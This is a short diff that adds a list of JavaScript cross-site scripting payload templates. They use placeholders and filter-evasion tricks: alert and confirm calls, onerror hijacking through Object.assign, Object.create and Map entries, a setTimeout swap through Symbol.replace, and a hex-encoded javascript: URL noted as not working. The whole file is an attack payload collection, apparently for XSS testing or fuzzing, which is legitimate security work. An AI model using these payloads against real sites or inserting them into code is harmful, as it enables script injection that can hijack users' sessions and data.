@@ -1,0 +1,12 @@
+alert({PAYLOAD})
+confirm({PAYLOAD})
+print({PAYLOAD})
+[0].with(0,alert).splice(0,1).at(0)({PAYLOAD});
+location.hash.slice(1).replace(globalThis, globalThis[Symbol[`${`replace`}`]]=setTimeout);
+Object.assign({x:0},{x:onerror=alert});throw 7;
+Object.create({},{x:{value:onerror=alert}}); throw 7;
+Object.getOwnPropertyDescriptors({x:onerror=alert}).value; throw 7;
+Object.fromEntries((new Map).add('x',onerror=alert));throw 1337;
+
+#!not working
+location.assign('#javascript:\x61\x6c\x65\x72\x74\x281337\x29');
